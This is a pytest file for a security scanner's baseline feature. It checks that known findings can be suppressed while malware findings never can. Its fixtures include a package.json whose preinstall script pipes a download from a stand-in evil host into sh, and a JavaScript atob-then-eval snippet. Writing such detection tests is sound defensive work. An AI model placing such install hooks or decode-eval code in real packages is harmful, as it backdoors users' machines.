"""Baselines: adopting the tool without fixing the backlog first.

The failure this feature prevents is an adoption failure rather than a security
one. Turn a scanner on in an existing codebase, get four hundred findings, turn
it off -- that is the most common way a security tool fails to be used at all.

The failure this feature could *introduce* is a security one, and every test
here is about the boundary between the two. A baseline is a record of debt
somebody chose to carry. It must never become a way to carry malware.

Written after finding that `cordon baseline create|compare` was documented in
the interface specification, the `Baseline` class was implemented, tested and
exported from the SDK, and no command existed. The documented adoption path was
not reachable from the command line.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from cordon.cli.main import main
from cordon.core.policy import Baseline

LEGACY = "const p = atob(B);\neval(p);\n"
MALWARE = (
    '{"name":"evil","version":"1.0.0","scripts":{"preinstall":"curl http://evil.test/s.sh | sh"}}'
)


@pytest.fixture
def project(tmp_path):
    root = tmp_path / "repo"
    root.mkdir()
    (root / "legacy.js").write_text(LEGACY)
    return root


def create(root, path=None, capsys=None) -> str:
    out = str(path or (root / "cordon-baseline.json"))
    assert main(["baseline", "create", str(root), "-o", out]) == 0
    if capsys is not None:
        capsys.readouterr()  # discard, so the next assertion reads only its own output
    return out


class TestCreate:
    def test_it_writes_a_file(self, project) -> None:
        out = create(project)
        data = json.loads(Path(out).read_text(encoding="utf-8"))
        assert data["version"] == 2
        assert data["fingerprints"]

    def test_each_entry_names_the_rule_and_the_path(self, project) -> None:
        """A fingerprint is a pure function of values the committer controls, so
        an attacker can compute the one their payload produces and add it in the
        same commit. Against a bare list of hashes a reviewer cannot see what a
        new line means; `SUSPECT.DECODE_EXEC.001 at legacy.js` is legible."""
        data = json.loads(Path(create(project)).read_text(encoding="utf-8"))
        assert data["entries"]
        for entry in data["entries"]:
            assert entry["rule"] and entry["path"] and entry["fingerprint"]

    def test_an_older_file_without_entries_still_loads(self, project) -> None:
        """The format change must not be a migration."""
        path = Path(create(project))
        data = json.loads(path.read_text(encoding="utf-8"))
        path.write_text(json.dumps({"version": 1, "fingerprints": data["fingerprints"]}))
        assert main(["scan", str(project), "--baseline", str(path), "--no-cache", "-q"]) == 0

    def test_the_file_is_sorted_so_a_diff_is_reviewable(self, project) -> None:
        """A baseline is reviewed as a diff or it is not reviewed. Unsorted
        output makes every regeneration look like a large change."""
        data = json.loads(Path(create(project)).read_text(encoding="utf-8"))
        assert data["fingerprints"] == sorted(data["fingerprints"])

    def test_it_records_fingerprints_not_line_numbers(self, project) -> None:
        """Keyed on fingerprint so reformatting a file does not empty the
        baseline and re-raise everything it contained."""
        first = json.loads(Path(create(project)).read_text(encoding="utf-8"))["fingerprints"]
        (project / "legacy.js").write_text("// a new comment\n\n" + LEGACY)
        second = json.loads(Path(create(project)).read_text(encoding="utf-8"))["fingerprints"]
        assert first == second

    def test_creating_does_not_fail_the_build(self, project) -> None:
        assert main(["baseline", "create", str(project), "-o", str(project / "b.json")]) == 0


class TestApply:
    def test_a_baselined_finding_stops_failing_the_build(self, project) -> None:
        out = create(project)
        assert main(["scan", str(project), "--baseline", out, "--no-cache", "-q"]) == 0

    def test_it_is_marked_rather_than_removed(self, project, capsys) -> None:
        """A baseline that hides its own contents is indistinguishable from a
        scanner that stopped working. An auditor's first question is what the
        tool was told to ignore."""
        out = create(project, capsys=capsys)
        main(["scan", str(project), "--baseline", out, "--no-cache", "-f", "json"])
        payload = json.loads(capsys.readouterr().out)
        baselined = [f for f in payload["findings"] if f.get("suppressed")]
        assert baselined
        assert baselined[0]["suppressed"]["approved_by"] == "baseline"

    def test_a_new_finding_still_fails(self, project) -> None:
        out = create(project)
        (project / "package.json").write_text(MALWARE)
        assert main(["scan", str(project), "--baseline", out, "--no-cache", "-q"]) == 1


class TestABaselineCannotAbsorbMalware:
    """The line the feature must not cross. A baseline records "we have not
    fixed this yet", which is not a coherent position to hold about evidence of
    intent to harm."""

    def test_malware_recorded_in_a_baseline_still_fails_the_build(self, tmp_path) -> None:
        root = tmp_path / "repo"
        root.mkdir()
        (root / "package.json").write_text(MALWARE)
        out = create(root)
        assert main(["scan", str(root), "--baseline", out, "--no-cache", "-q"]) == 1

    def test_it_is_not_even_marked_as_suppressed(self, tmp_path, capsys) -> None:
        root = tmp_path / "repo"
        root.mkdir()
        (root / "package.json").write_text(MALWARE)
        out = create(root, capsys=capsys)
        main(["scan", str(root), "--baseline", out, "--no-cache", "-f", "json"])
        payload = json.loads(capsys.readouterr().out)
        malicious = [f for f in payload["findings"] if f["category"] == "malicious"]
        assert malicious
        assert all(not f.get("suppressed") for f in malicious)

    def test_create_still_records_it(self, tmp_path) -> None:
        """Filtering malicious findings out at creation would make the file look
        complete while quietly omitting the ones that matter. It is recorded and
        refused at apply time, where the refusal is visible."""
        root = tmp_path / "repo"
        root.mkdir()
        (root / "package.json").write_text(MALWARE)
        data = json.loads(Path(create(root)).read_text(encoding="utf-8"))
        assert data["fingerprints"]


class TestCompare:
    def test_a_clean_comparison_passes(self, project) -> None:
        create(project)
        assert main(["baseline", "compare", str(project)]) == 0

    def test_a_new_finding_is_reported(self, project, capsys) -> None:
        create(project, capsys=capsys)
        (project / "package.json").write_text(MALWARE)
        code = main(["baseline", "compare", str(project)])
        assert code == 1
        assert "MALWARE.INSTALL.FETCH_EXEC.001" in capsys.readouterr().out

    def test_a_cleared_finding_is_reported(self, project, capsys) -> None:
        """Both directions matter. A baseline that only ever grows stops meaning
        anything within a year."""
        create(project, capsys=capsys)
        (project / "legacy.js").write_text("const safe = 1;\n")
        main(["baseline", "compare", str(project)])
        out = capsys.readouterr().out
        assert "no longer occur" in out

    def test_compare_never_writes(self, project) -> None:
        """Refreshing a baseline has to be deliberate. If the command run in CI
        to detect new findings were also the command that absorbed them, the
        check would erase itself on first failure."""
        out = create(project)
        before = Path(out).read_text(encoding="utf-8")
        (project / "package.json").write_text(MALWARE)
        main(["baseline", "compare", str(project)])
        assert Path(out).read_text(encoding="utf-8") == before


class TestFailureHandling:
    def test_a_missing_baseline_is_an_error(self, project, capsys) -> None:
        """Not an empty baseline. A mistyped path would otherwise silently
        re-raise the entire backlog, which reads as the tool having broken and
        is the fastest route to it being switched off."""
        assert main(["scan", str(project), "--baseline", "nope.json", "--no-cache", "-q"]) == 3
        assert "not found" in capsys.readouterr().err

    def test_a_corrupt_baseline_is_an_error(self, project, tmp_path, capsys) -> None:
        bad = tmp_path / "bad.json"
        bad.write_text("not json at all")
        assert main(["scan", str(project), "--baseline", str(bad), "--no-cache", "-q"]) == 3

    def test_a_baseline_of_the_wrong_shape_is_an_error(self, project, tmp_path) -> None:
        """Degrading to "suppress nothing" would be noisy; degrading to
        "suppress everything" would be silent. The parser should not be the
        thing deciding which."""
        bad = tmp_path / "bad.json"
        bad.write_text('{"version": 1}')
        assert main(["scan", str(project), "--baseline", str(bad), "--no-cache", "-q"]) == 3

    def test_the_class_round_trips(self, tmp_path) -> None:
        path = tmp_path / "b.json"
        Baseline(["aaa", "bbb"]).write(path)
        assert len(Baseline.from_file(path)) == 2
